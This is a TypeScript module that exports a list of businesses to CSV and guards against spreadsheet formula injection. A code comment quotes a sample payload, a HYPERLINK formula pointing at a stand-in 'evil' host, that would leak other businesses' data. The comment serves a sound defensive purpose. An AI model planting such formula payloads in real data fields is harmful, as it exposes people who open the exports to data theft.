import { formatIstDate } from '@/lib/invoices/ist-date';
import type { BusinessItem } from './types';

/**
 * SEC-02: one CSV text cell. Business names, phones and e-mails are typed by whoever signs up, and Excel / Google
 * Sheets run a cell that starts with = + - @ (or a tab, carriage return or line feed) as a formula, even inside quotes, e.g.
 * =HYPERLINK("https://evil/?"&C3,"Open") would leak another business's data when the admin opens the file.
 * The full-width forms ＝ ＋ － ＠ count too (Excel with East Asian input). Such values get a leading apostrophe (shown as plain text); every cell is quoted with "" escaping.
 */
export function csvCell(value: string | null | undefined): string {
  const text = value ?? '';
  const safe = /^[=+\-@\t\r\n\uFF1D\uFF0B\uFF0D\uFF20]/.test(text) ? `'${text}` : text;
  return `"${safe.replace(/"/g, '""')}"`;
}

export function buildBusinessesCsv(rows: BusinessItem[]): string {
  const headers = [
    'Legal Name',
    'Trade Name',
    'GSTIN',
    'Email',
    'Phone',
    'Plan',
    'Status',
    'Expires At',
    'Invoices',
    'Staff',
    'Joined Date',
  ];
  const dataRows = rows.map((b) => [
    csvCell(b.legalName),
    csvCell(b.tradeName),
    csvCell(b.gstin),
    csvCell(b.email),
    csvCell(b.phone),
    csvCell(b.subscriptionPlan),
    csvCell(b.subscriptionStatus),
    csvCell(b.subscriptionEndsAt ? formatIstDate(b.subscriptionEndsAt) : 'N/A'),
    b.invoiceCount,
    b.userCount,
    csvCell(formatIstDate(b.createdAt)),
  ]);

  return [headers.join(','), ...dataRows.map((r) => r.join(','))].join('\n');
}

export function downloadBusinessesCsv(rows: BusinessItem[]): void {
  // SEC-02: a Blob URL, not an encodeURI data: URL (a "#" in any business name cut the file short there).
  const blob = new Blob([buildBusinessesCsv(rows)], { type: 'text/csv;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = `bill_matrix_businesses_${new Date().toISOString().split('T')[0]}.csv`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  setTimeout(() => URL.revokeObjectURL(url), 0);
}

